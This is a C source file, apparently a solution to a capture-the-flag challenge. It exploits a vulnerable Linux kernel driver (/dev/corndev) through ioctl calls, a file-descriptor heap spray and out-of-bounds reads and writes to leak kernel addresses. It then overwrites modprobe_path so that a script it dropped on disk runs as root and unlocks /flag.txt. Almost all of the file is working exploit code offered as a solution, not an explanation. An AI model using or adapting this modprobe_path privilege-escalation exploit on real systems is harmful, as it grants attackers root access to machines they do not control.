#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <stdint.h>

#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/msg.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/shm.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

static inline void panic(const char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}


void pin_cpu(int cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        panic("sched_setaffinity");
    }
}


#define devfile "/dev/corndev"

int devfd;

static void inline openDev(){
    devfd = open(devfile, O_RDWR);
    if(devfd < 0){
        panic("open "devfile);
    }
}

static inline int setIdx(uint idx){
    return ioctl(devfd, 0, idx);
}

static inline  int delCorn(){
    return ioctl(devfd, 1);
}

static inline int allocCorn(){
    return ioctl(devfd, 3);
}

static inline int addOffsetCorn(uint64_t offset){
    return ioctl(devfd, 4, offset);
}

int fds[0x200];

int main(int argc, char **argv, char **envp)
{
    system("echo -e \"#!/bin/sh\nchmod 777 /flag.txt\" > /home/noob/vjp");
    system("chmod +x /home/noob/vjp");

    openDev();
start:
    setIdx(0);
    
    for(uint32_t i = 0 ; i < 0x200; i++){
        fds[i] = open("/proc/self/stat",0);
    }

    allocCorn();

    addOffsetCorn((uint64_t)-0x8);

    char buf[40];

    uint64_t addr = 0;
// offset to leak 0x138

    read(devfd, &addr, sizeof addr);
    logInfo("0x%lx", addr);

    lseek64(devfd, 0, 0);

    uint64_t vic = addr - 0x48-0x1000+0x58;

    write(devfd, &vic, sizeof vic);

    lseek64(devfd, 0, 0);
    addOffsetCorn(8);

    read(devfd, &vic, sizeof vic);

    logInfo("0x%lx", vic);

    if(vic == 0){
        delCorn();
        for(uint32_t i = 0 ; i < 0x200; i++){
        close(fds[i]);
        }
        goto start;
    }

    lseek64(devfd, 0, 0);

    setIdx(1);
    allocCorn();

    addOffsetCorn((uint64_t)-8);
    write(devfd, &vic, sizeof vic);

    addOffsetCorn((uint64_t)8);

    lseek64(devfd, 0, 0);
    read(devfd, &vic, sizeof vic);

    logInfo("0x%lx", vic);

    vic += 0x185e4a0;

    setIdx(2);
    allocCorn();

    addOffsetCorn((uint64_t)-8);
    write(devfd, &vic, sizeof vic);


    addOffsetCorn((uint64_t)8);

    lseek64(devfd, 0, 0);
    write(devfd, "/home/noob/vjp", 15);

    system("echo -e '\x13\x37\x42\x42' > /home/noob/pwn" ); //Non-ascii for /home/noob/pwn
    system("chmod +x /home/noob/pwn"); 
    system("/home/noob/pwn" );  // trigger call modprobe_path
}